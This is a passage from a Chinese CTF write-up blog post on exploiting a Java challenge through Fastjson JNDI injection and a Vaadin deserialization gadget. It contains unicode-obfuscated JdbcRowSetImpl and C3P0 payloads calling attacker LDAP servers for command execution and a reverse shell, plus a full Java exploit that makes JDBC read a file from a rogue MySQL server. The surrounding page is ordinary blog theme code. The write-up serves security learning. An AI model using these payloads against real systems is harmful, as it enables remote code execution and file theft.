class="hljs-number">1</span><br><span class="hljs-attr">User-Agent:</span> <span class="hljs-string">Mozilla/5.0</span> <span class="hljs-string">(Windows</span> <span class="hljs-string">NT</span> <span class="hljs-number">10.0</span><span class="hljs-string">;</span> <span class="hljs-string">Win64;</span> <span class="hljs-string">x64)</span> <span class="hljs-string">AppleWebKit/537.36</span> <span class="hljs-string">(KHTML,</span> <span class="hljs-string">like</span> <span class="hljs-string">Gecko)</span> <span class="hljs-string">Chrome/83.0.4103.116</span> <span class="hljs-string">Safari/537.36</span><br><span class="hljs-attr">sec-ch-ua:</span> <span class="hljs-string">&quot;Not A(Brand&quot;</span><span class="hljs-string">;v=&quot;99&quot;,</span> <span class="hljs-string">&quot;Google Chrome&quot;</span><span class="hljs-string">;v=&quot;121&quot;,</span> <span class="hljs-string">&quot;Chromium&quot;</span><span class="hljs-string">;v=&quot;121&quot;</span><br><span class="hljs-attr">sec-ch-ua-mobile:</span> <span class="hljs-string">?0</span><br><span class="hljs-attr">sec-ch-ua-platform:</span> <span class="hljs-string">&quot;Windows&quot;</span><br><br><span class="hljs-string">data=&#123;&#123;urlenc(eyJAdHlwZSI6Ilx1MDA2M1x1MDA2Zlx1MDA2ZFx1MDAyZVx1MDA3M1x1MDA3NVx1MDA2ZVx1MDAyZVx1MDA3Mlx1MDA2Zlx1MDA3N1x1MDA3M1x1MDA2NVx1MDA3NFx1MDAyZVx1MDA0YVx1MDA2NFx1MDA2Mlx1MDA2M1x1MDA1Mlx1MDA2Zlx1MDA3N1x1MDA1M1x1MDA2NVx1MDA3NFx1MDA0OVx1MDA2ZFx1MDA3MFx1MDA2YyIsImRhdGFTb3VyY2VOYW1lIjoibGRhcDovLzEwNy4xNzQuMjI4Ljc5OjEzODkvQmFzaWMvQ29tbWFuZC9jYWxjIiwiYXV0b0NvbW1pdCI6dHJ1ZX0=)&#125;&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>‍</p>
+<p>直接反弹shell即可</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;dataSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://xxx:1389/Basic/ReverseShell/xxx/7979&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;autoCommit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334979.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<p>当然除了直接打1.2.24的JNDI 也可以打C3P0的JNDI,只是需要用unicode或者16进制去绕过即可</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml">&#123;<span class="hljs-string">&quot;@type&quot;</span><span class="hljs-string">:&quot;com.mchange.v2.c3p0.\u004a\u006e\u0064\u0069\u0052\u0065\u0066\u0043\u006f\u006e\u006e\u0065\u0063\u0074\u0069\u006f\u006e\u0050\u006f\u006f\u006c\u0044\u0061\u0074\u0061\u0053\u006f\u0075\u0072\u0063\u0065&quot;</span>,<span class="hljs-string">&quot;\u004a\u006e\u0064\u0069\u004e\u0061\u006d\u0065&quot;</span><span class="hljs-string">:&quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;</span>, <span class="hljs-string">&quot;LoginTimeout&quot;</span><span class="hljs-string">:0</span>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>‍</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334141.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<h3 id="不出网打二次反序列化"><a href="#不出网打二次反序列化" class="headerlink" title="不出网打二次反序列化"></a>不出网打二次反序列化</h3><p>C3P0打二次反序列化, 可以看到该题存在Vaadin的依赖，所以可以通过C3P0打Vaadin的反序列化，但是由于他把<code>TemplatesImpl</code>​的16进制也给ban了，这样子我们就没办法用C3P0打二次反序列化来使用<code>TemplatesImpl</code>​加载字节码了</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334306.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>所以只能另从别的思路来看，从始至终我们并没有去讨论题目的<code>bean</code>​目录，现在来看下</p>
+<p>一个接口</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334525.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334680.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>可以发现这里存在<code>getConnection</code>​方法，而在Vaadin分析中可以得知，其链子一部分是可以调用任意属性的getter方法的，所以在这里思路就是：调用<code>getConnection</code>​方法来控制JDBC来连恶意的mysql从而读取flag，而已的mysql为</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/fnmsd/MySQL_Fake_Server">https://github.com/fnmsd/MySQL_Fake_Server</a></p>
+<p>‍</p>
+<p>根据Vaadin的exp来修改下即可，最后的exp(这里参考大头Sec的Wp)为</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.ctf.bean.MyBean;<br><span class="hljs-keyword">import</span> com.vaadin.data.util.NestedMethodProperty;<br><span class="hljs-keyword">import</span> com.vaadin.data.util.PropertysetItem;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Vaadin_Ser</span> &#123;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span>  <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span><span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object</span><br><span class="hljs-params">            value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] ser(Object obj) <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(bos);<br>        out.writeObject(obj);<br>        out.flush();<br>        <span class="hljs-keyword">return</span> bos.toByteArray();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">bytesToHexString</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bArray)</span> &#123;<br>        <span class="hljs-type">StringBuffer</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>(bArray.length);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">byte</span> b : bArray) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">sTemp</span> <span class="hljs-operator">=</span> Integer.toHexString(<span class="hljs-number">255</span> &amp; b);<br>            <span class="hljs-keyword">if</span> (sTemp.length() &lt; <span class="hljs-number">2</span>) &#123;<br>                sb.append(<span class="hljs-number">0</span>);<br>            &#125;<br>            sb.append(sTemp.toUpperCase());<br>        &#125;<br>        <span class="hljs-keyword">return</span> sb.toString();<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">MyBean</span> <span class="hljs-variable">myBean</span> <span class="hljs-operator">=</span><span class="hljs-keyword">new</span> <span class="hljs-title class_">MyBean</span>();<br>        myBean.setDatabase(<span class="hljs-string">&quot;mysql://xxx:3306/test?user=fileread_file:///flag.txt&amp;ALLOWLOADLOCALINFILE=true&amp;maxAllowedPacket=65536&amp;allowUrlInLocalInfile=true#&quot;</span>);<br><br>        <span class="hljs-type">PropertysetItem</span> <span class="hljs-variable">pItem</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PropertysetItem</span>();<br><br>        NestedMethodProperty&lt;Object&gt; nmprop = <span class="hljs-keyword">new</span> <span class="hljs-title class_">NestedMethodProperty</span>&lt;Object&gt;(myBean, <span class="hljs-string">&quot;Connection&quot;</span>);<br>        pItem.addItemProperty(<span class="hljs-string">&quot;Connection&quot;</span>, nmprop);<br><br>        <span class="hljs-comment">// 实例化 BadAttributeValueExpException 并反射写入</span><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">exception</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-string">&quot;zjacky&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span>     <span class="hljs-operator">=</span> BadAttributeValueExpException.class.getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(exception, pItem);<br><br>        <span class="hljs-comment">// 序列化并输出 HEX 序列化结果</span><br>        System.out.println(bytesToHexString(ser(exception)));<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里有一个很重要的东西，就是包名一定要得对(CTFer的痛)</p>
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334863.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">mysql:<span class="hljs-comment">//1.1.1.1:3306/test?user=fileread_file:///.&amp;ALLOWLOADLOCALINFILE=true&amp;maxAllowedPacket=65536&amp;allowUrlInLocalInfile=true#</span><br><br>mysql:<span class="hljs-comment">//1.1.1.1:3306/test?user=fileread_file:///flag.txt&amp;ALLOWLOADLOCALINFILE=true&amp;maxAllowedPacket=65536&amp;allowUrlInLocalInfile=true#</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402082334081.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Java%E5%AE%89%E5%85%A8/" class="category-chain-item">Java安全</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Java%E5%AE%89%E5%85%A8/" class="print-no-link">#Java安全</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Java安全 - Learning Vaadin Gadget From CTF</div>
+      <div>https://zjackky.github.io/post/java-safety-learning-vaadin-gadget-from-ctf-z1imvgg.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Zjacky</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年2月8日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/post/code-audit-php-let-s-talk-about-the-west-lake-discussion-sword-phpems-29qhni.html" title="代码审计 - PHP - 再谈西湖论剑PHPEMS">
+                        <span class="hidden-mobile">代码审计 - PHP - 再谈西湖论剑PHPEMS</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'Zjackky/Zjackky.github.io');
+      s.setAttribute('issue-term', 'pathname');
+      
+      s.setAttribute('label', 'utterances');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://github.com/Zjackky/Zjackky.github.io" target="_blank" rel="nofollow noopener"><span>My Github</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div style="font-size: 0.85rem"> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
